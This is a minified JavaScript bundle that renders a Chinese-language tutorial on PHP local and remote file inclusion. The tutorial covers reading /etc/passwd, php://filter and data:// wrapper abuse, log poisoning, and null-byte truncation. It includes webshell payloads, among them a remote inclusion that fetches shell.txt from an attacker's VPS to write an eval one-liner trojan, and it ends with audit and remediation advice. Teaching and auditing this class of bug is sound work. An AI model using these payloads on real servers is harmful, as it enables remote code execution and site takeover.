(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[27],{157:function(e,a,t){"use strict";t.r(a),t.d(a,"default",(function(){return o}));t(130),t(0);var n=t(93);function p(){return(p=Object.assign||function(e){for(var a=1;a<arguments.length;a++){var t=arguments[a];for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n])}return e}).apply(this,arguments)}function c(e,a){if(null==e)return{};var t,n,p=function(e,a){if(null==e)return{};var t,n,p={},c=Object.keys(e);for(n=0;n<c.length;n++)t=c[n],a.indexOf(t)>=0||(p[t]=e[t]);return p}(e,a);if(Object.getOwnPropertySymbols){var c=Object.getOwnPropertySymbols(e);for(n=0;n<c.length;n++)t=c[n],a.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(p[t]=e[t])}return p}var b={},s="wrapper";function o(e){var a=e.components,t=c(e,["components"]);return Object(n.b)(s,p({},b,t,{components:a,mdxType:"MDXLayout"}),Object(n.b)("h1",{className:"__internal",id:"文件包含漏洞"},"文件包含漏洞",Object(n.b)("a",p({parentName:"h1"},{href:"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"程序开发人员通常出于灵活性的考虑，会将被包含的文件设置成变量，然后动态调用这些文件。"),Object(n.b)("p",{parentName:"blockquote"},"但正是因为调用的灵活性导致用户可能调用一些恶意文件，造成文件包含漏洞 ")),Object(n.b)("h1",{className:"__internal",id:"本地文件包含lfi"},"本地文件包含(LFI)",Object(n.b)("a",p({parentName:"h1"},{href:"#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABlfi","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"文件包含漏洞的产生原因是 PHP 语言在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，"),Object(n.b)("p",{parentName:"blockquote"},"或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。"),Object(n.b)("p",{parentName:"blockquote"},"当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。")),Object(n.b)("h2",{className:"__internal",id:"漏洞利用"},"漏洞利用",Object(n.b)("a",p({parentName:"h2"},{href:"#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"利用条件：")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"（1）include()等函数通过动态变量的方式引入包含文件；\n（2）用户能够控制该动态变量。")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"1、读取敏感文件")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(n.b)("pre",p({parentName:"div"},{className:"language-bash"}),Object(n.b)("code",p({parentName:"pre"},{className:"language-bash"}),"?arg",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"="),"/etc/passwd"))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"2、利用封装协议读源码")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(n.b)("pre",p({parentName:"div"},{className:"language-bash"}),Object(n.b)("code",p({parentName:"pre"},{className:"language-bash"}),"?arg",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"="),"php://filter/read",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"="),"convert.base64-encode/resource",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"="),"config.php\t",Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"#这样能看到php文件的源码")))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"3、包含图片Getshell")),Object(n.b)("p",null,"在上传的图片中写入恶意代码，然后用 LFI 包含调用，就会执行图片里的PHP代码"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"4、截断包含")),Object(n.b)("p",null,"漏洞代码："),Object(n.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(n.b)("pre",p({parentName:"div"},{className:"language-php"}),Object(n.b)("code",p({parentName:"pre"},{className:"language-php"}),Object(n.b)("span",p({parentName:"code"},{className:"token php language-php"}),Object(n.b)("span",p({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n",Object(n.b)("span",p({parentName:"span"},{className:"token keyword"}),"if"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",p({parentName:"span"},{className:"token keyword"}),"isset"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",p({parentName:"span"},{className:"token variable"}),"$_GET"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),"["),Object(n.b)("span",p({parentName:"span"},{className:"token single-quoted-string string"}),"'arg'"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),"]"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),")"),"\n",Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(n.b)("span",p({parentName:"span"},{className:"token keyword"}),"include"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",p({parentName:"span"},{className:"token variable"}),"$_GET"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),"["),Object(n.b)("span",p({parentName:"span"},{className:"token single-quoted-string string"}),"'arg'"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),"]"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),"."),Object(n.b)("span",p({parentName:"span"},{className:"token double-quoted-string string"}),'".php"'),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),";")," \n",Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),"}"),Object(n.b)("span",p({parentName:"span"},{className:"token keyword"}),"else"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(n.b)("span",p({parentName:"span"},{className:"token keyword"}),"include"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),"("),"index",Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),"."),"php",Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),";"),"\n ",Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(n.b)("span",p({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(n.b)("p",null,"这样做一定程度上修复了漏洞， 上传",Object(n.b)("strong",{parentName:"p"},"图片一句话"),"并访问：",Object(n.b)("inlineCode",{parentName:"p"},"http://vuln.com/index.php?arg=1.jpg"),"会出错。"),Object(n.b)("p",null,"因为包含文件里面不存在",Object(n.b)("inlineCode",{parentName:"p"},"1.jpg.php"),"这个文件。"),Object(n.b)("p",null,"但是如果输入",Object(n.b)("inlineCode",{parentName:"p"},"http://vuln.com/index.php?arg=1.jpg%00"),"，就极有可能会绕过检测。"),Object(n.b)("p",null,"这种方法只适用于",Object(n.b)("inlineCode",{parentName:"p"},"php.ini"),"中",Object(n.b)("inlineCode",{parentName:"p"},"magic_quotes_qpc=off"),"并且",Object(n.b)("inlineCode",{parentName:"p"},"PHP"),"版本< 5.3.4的情况。"),Object(n.b)("p",null,"如果为on，%00会被转义，以至于无法截断。"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"5、包含Apache日志Getshell")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},Object(n.b)("strong",{parentName:"p"},"条件："),"知道日志文件access.log的存放位置 ，默认位置：",Object(n.b)("inlineCode",{parentName:"p"},"/var/log/httpd/access_log")," ")),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"access.log"),"文件记录了客户端每次请求的相关信息；\n当我们访问一个不存在的资源时",Object(n.b)("inlineCode",{parentName:"p"},"access.log"),"文件仍然会记录这条资源信息。 "),Object(n.b)("p",null,"如果目标网站存在文件包含漏洞，但是没有可以包含的文件时，"),Object(n.b)("p",null,"我们就可以尝试访问",Object(n.b)("inlineCode",{parentName:"p"},"http://www.vuln.com/<?php phpinfo(); ?>")),Object(n.b)("p",null,"Apache会将这条信息记录在access.log文件中，这时如果我们访问access.log文件，就会触发文件包含漏洞。"),Object(n.b)("p",null,"理论上是这样的，但是实际上却是输入的代码被转义无法解析。"),Object(n.b)("p",null,"攻击者可以通过burpsuite进行抓包在http请求包里面将转义的代码改为正常的测试代码就可以绕过。"),Object(n.b)("p",null,"这时再查看Apache日志文件，显示的就是正常的测试代码。"),Object(n.b)("p",null,"这时访问：",Object(n.b)("inlineCode",{parentName:"p"},"http://www.vuln.com/index.php?arg=/var/log/httpd/access_log"),"，即可成功执行代码"),Object(n.b)("h2",{className:"__internal",id:"php中的封装协议伪协议"},"PHP中的封装协议(伪协议)",Object(n.b)("a",p({parentName:"h2"},{href:"#php%E4%B8%AD%E7%9A%84%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E4%BC%AA%E5%8D%8F%E8%AE%AE","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"以下协议未写明条件的即是allow_url_fopen和allow_url_include状态off/on都行。"),Object(n.b)("h3",{className:"__internal",id:"file"},Object(n.b)("strong",{parentName:"h3"},"file://"),Object(n.b)("a",p({parentName:"h3"},{href:"#file","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"作用：")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"用于访问本地文件系统，在CTF中通常用来读取本地文件,且不受allow_url_fopen与allow_url_include的影响。"),Object(n.b)("p",{parentName:"blockquote"},"include()/require()/include_once()/require_once()参数可控的情况下"),Object(n.b)("p",{parentName:"blockquote"},"如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"示例：")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(n.b)("pre",p({parentName:"div"},{className:"language-bash"}),Object(n.b)("code",p({parentName:"pre"},{className:"language-bash"}),Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"#1. file://[文件的绝对路径和文件名]"),"\nhttp://127.0.0.1/include.php?file",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"="),"file://C:",Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),"\\"),"phpStudy",Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),"\\"),"PHPTutorial",Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),"\\"),"WWW",Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),"\\"),"phpinfo.txt\n\n",Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"#2. file://[文件的相对路径和文件名]"),"\nhttp://127.0.0.1/include.php?file",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"="),"./phpinfo.txt\n\n",Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"#3. file://[网络路径和文件名]"),"\nhttp://127.0.0.1/include.php?file",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"="),"http://127.0.0.1/phpinfo.txt"))),Object(n.b)("h3",{className:"__internal",id:"php"},Object(n.b)("strong",{parentName:"h3"},"php://"),Object(n.b)("a",p({parentName:"h3"},{href:"#php","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"条件：")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"allow_url_fopen:off/on"),Object(n.b)("p",{parentName:"blockquote"},"allow_url_include : 部分需要on (下面列出)"),Object(n.b)("p",{parentName:"blockquote"},"php://input"),Object(n.b)("p",{parentName:"blockquote"},"php://stdin"),Object(n.b)("p",{parentName:"blockquote"},"php://memory "),Object(n.b)("p",{parentName:"blockquote"},"php://temp")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"作用：")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是 php://filter 和 php://input"),Object(n.b)("p",{parentName:"blockquote"},"php://filter用于",Object(n.b)("strong",{parentName:"p"},"读取源码"),"，php://input用于",Object(n.b)("strong",{parentName:"p"},"执行"),"php代码")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"示例：")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(n.b)("pre",p({parentName:"div"},{className:"language-bash"}),Object(n.b)("code",p({parentName:"pre"},{className:"language-bash"}),Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"#1. php://filter/read=convert.base64-encode/resource=[文件名]  //读取文件源码"),"\nhttp://127.0.0.1/include.php?file",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"="),"php://filter/read",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"="),"convert.base64-encode/resource",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"="),"phpinfo.php\n\n",Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"#2.php://input + [POST DATA]执行php代码"),"\nhttp://127.0.0.1/include.php?file",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"="),"php://input\n",Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),"["),"POST DATA部分",Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),"]")," ",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"<"),"?php phpinfo",Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),";")," ?",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),">"),"\n\n",Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"#3.若有写入权限，[POST DATA部分] 写入一句话木马"),"\n",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"<"),"?php fputs",Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),"("),"fopen",Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",p({parentName:"code"},{className:"token string"}),"'shell.php'"),",",Object(n.b)("span",p({parentName:"code"},{className:"token string"}),"'w'"),Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),")"),",",Object(n.b)("span",p({parentName:"code"},{className:"token string"}),"'<?php @eval(",Object(n.b)("span",p({parentName:"span"},{className:"token variable"}),"$_GET"),"[cmd]); ?>'"),Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),";")," ?",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("h3",{className:"__internal",id:"zip--bzip2--zlib"},Object(n.b)("strong",{parentName:"h3"},"zip:// & bzip2:// & zlib://"),Object(n.b)("a",p({parentName:"h3"},{href:"#zip--bzip2--zlib","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"作用：")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"zip:// & bzip2:// & zlib:// 均属于压缩流，可以访问压缩文件中的子文件"),Object(n.b)("p",{parentName:"blockquote"},"更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"示例：")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"html"},Object(n.b)("pre",p({parentName:"div"},{className:"language-html"}),Object(n.b)("code",p({parentName:"pre"},{className:"language-html"}),"1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）\n",Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"\x3c!--压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传--\x3e"),"\nhttp://127.0.0.1/include.php?file=zip://C:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt\n\n2.compress.bzip2://file.bz2\n",Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"\x3c!--压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）--\x3e"),"\nhttp://127.0.0.1/include.php?file=compress.bzip2://C:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2\n\n3.compress.zlib://file.gz \n",Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"\x3c!--压缩 phpinfo.txt 为 phpinfo.gz--\x3e"),"\nhttp://127.0.0.1/include.php?file=compress.zlib://C:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz"))),Object(n.b)("h3",{className:"__internal",id:"data"},Object(n.b)("strong",{parentName:"h3"},"data://"),Object(n.b)("a",p({parentName:"h3"},{href:"#data","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"条件：")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"allow_url_fopen:on"),Object(n.b)("p",{parentName:"blockquote"},"allow_url_include :on")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"作用：")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"自PHP>=5.2.0起，可以使用 data:// 数据流封装器，以传递相应格式的数据。"),Object(n.b)("p",{parentName:"blockquote"},"通常可以用来执行PHP代码")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"示例：")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(n.b)("pre",p({parentName:"div"},{className:"language-bash"}),Object(n.b)("code",p({parentName:"pre"},{className:"language-bash"}),Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"#1.data://text/plain,"),"\nhttp://127.0.0.1/include.php?file",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"="),"data://text/plain,",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"<"),"?php%20phpinfo",Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),";"),"?",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),">"),"\n\n",Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"#2.data://text/plain;base64,"),"\nhttp://127.0.0.1/include.php?file",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"="),"data://text/plain",Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),";"),"base64,PD9waHAgcGhwaW5mbygpOz8%2b"))),Object(n.b)("h3",{className:"__internal",id:"phar"},Object(n.b)("strong",{parentName:"h3"},"phar://"),Object(n.b)("a",p({parentName:"h3"},{href:"#phar","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"phar://协议与zip://类似，同样可以访问zip格式压缩包内容"),Object(n.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(n.b)("pre",p({parentName:"div"},{className:"language-bash"}),Object(n.b)("code",p({parentName:"pre"},{className:"language-bash"}),"http://127.0.0.1/include.php?file",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"="),"phar://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt"))),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},Object(n.b)("strong",{parentName:"p"},"利用条件 PHP > 5.3")),Object(n.b)("p",{parentName:"blockquote"},"要想使用Phar类里的方法，必须将phar.readonly配置项配置为0或Off"),Object(n.b)("p",{parentName:"blockquote"},"利用 phar 协议可以拓展 php 反序列化漏洞攻击面")),Object(n.b)("h1",{className:"__internal",id:"远程文件包含rfl"},"远程文件包含(RFL)",Object(n.b)("a",p({parentName:"h1"},{href:"#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrfl","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"服务器通过 PHP 的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，"),Object(n.b)("p",{parentName:"blockquote"},"从而可以去包含一个恶意文件，攻击者就可以远程构造一个特定的恶意文件达到攻击目的。")),Object(n.b)("h2",{className:"__internal",id:"漏洞利用-1"},"漏洞利用",Object(n.b)("a",p({parentName:"h2"},{href:"#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},Object(n.b)("strong",{parentName:"p"},"条件："),Object(n.b)("inlineCode",{parentName:"p"},"php.ini"),"中开启",Object(n.b)("inlineCode",{parentName:"p"},"allow_url_include"),"、",Object(n.b)("inlineCode",{parentName:"p"},"allow_url_fopen"),"选项。")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"1、远程包含Webshell")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(n.b)("pre",p({parentName:"div"},{className:"language-bash"}),Object(n.b)("code",p({parentName:"pre"},{className:"language-bash"}),"?arg",Object(n.b)("span",p({parentName:"code"},{className:"token operator"}),"="),"http://攻击者的VPS/shell.txt\n",Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"#会在网站目录生成名为 shell.php 的一句话木马")))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"shell.txt内容为：")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(n.b)("pre",p({parentName:"div"},{className:"language-php"}),Object(n.b)("code",p({parentName:"pre"},{className:"language-php"}),Object(n.b)("span",p({parentName:"code"},{className:"token php language-php"}),Object(n.b)("span",p({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(n.b)("span",p({parentName:"span"},{className:"token function"}),"fputs"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",p({parentName:"span"},{className:"token function"}),"fopen"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),"("),Object(n.b)("span",p({parentName:"span"},{className:"token single-quoted-string string"}),"'./shell.php'"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),","),Object(n.b)("span",p({parentName:"span"},{className:"token single-quoted-string string"}),"'w'"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),","),Object(n.b)("span",p({parentName:"span"},{className:"token single-quoted-string string"}),"'<?php @eval($_POST[123]) ?>'"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",p({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(n.b)("span",p({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(n.b)("h1",{className:"__internal",id:"代码审计方法"},"代码审计方法",Object(n.b)("a",p({parentName:"h1"},{href:"#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("h2",{className:"__internal",id:"文件包含用到的函数"},"文件包含用到的函数",Object(n.b)("a",p({parentName:"h2"},{href:"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%94%A8%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(n.b)("pre",p({parentName:"div"},{className:"language-php"}),Object(n.b)("code",p({parentName:"pre"},{className:"language-php"}),Object(n.b)("span",p({parentName:"code"},{className:"token keyword"}),"include"),Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),")"),"\t\t",Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"//使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。"),"\n",Object(n.b)("span",p({parentName:"code"},{className:"token function"}),"inclue_once"),Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),")"),"\t",Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。"),"\n\n",Object(n.b)("span",p({parentName:"code"},{className:"token keyword"}),"require"),Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),")"),"\t\t",Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"//使用此函数，只要程序执行，立即调用此函数包含文件发生错误时，会输出错误信息并立即终止程序。"),"\n",Object(n.b)("span",p({parentName:"code"},{className:"token keyword"}),"require_once"),Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",p({parentName:"code"},{className:"token punctuation"}),")"),"\t",Object(n.b)("span",p({parentName:"code"},{className:"token comment"}),"//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。")))),Object(n.b)("p",null,"代码审计的时候全局搜索以上函数"),Object(n.b)("p",null,"如果是基于图像上传的 ，要搜",Object(n.b)("inlineCode",{parentName:"p"},"$_FILES")," 变量， 因为PHP处理上传文件的功能，基本都与$_FILES有关。"),Object(n.b)("p",null,"查看目录结构，重点关注includes、modules等文件夹，查看index.php等文件是否",Object(n.b)("strong",{parentName:"p"},"动态调用"),"过这些内容，变量是否可控。"),Object(n.b)("h1",{className:"__internal",id:"修复方式"},"修复方式",Object(n.b)("a",p({parentName:"h1"},{href:"#%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("blockquote",null,Object(n.b)("ol",{parentName:"blockquote"},Object(n.b)("li",p({parentName:"ol"},{className:"__internal"}),"禁止远程文件包含 ",Object(n.b)("inlineCode",{parentName:"li"},"allow_url_include=off")),Object(n.b)("li",p({parentName:"ol"},{className:"__internal"}),"配置 ",Object(n.b)("inlineCode",{parentName:"li"},"open_basedir=指定目录"),"，限制访问区域。"),Object(n.b)("li",p({parentName:"ol"},{className:"__internal"}),"过滤",Object(n.b)("inlineCode",{parentName:"li"},"../"),"等特殊符号"),Object(n.b)("li",p({parentName:"ol"},{className:"__internal"}),"修改Apache日志文件的存放地址"),Object(n.b)("li",p({parentName:"ol"},{className:"__internal"}),"开启魔术引号 ",Object(n.b)("inlineCode",{parentName:"li"},"magic_quotes_qpc=on")),Object(n.b)("li",p({parentName:"ol"},{className:"__internal"}),"尽量不要使用动态变量调用文件，直接写要包含的文件。"))))}o.isMDXComponent=!0,o=o}}]);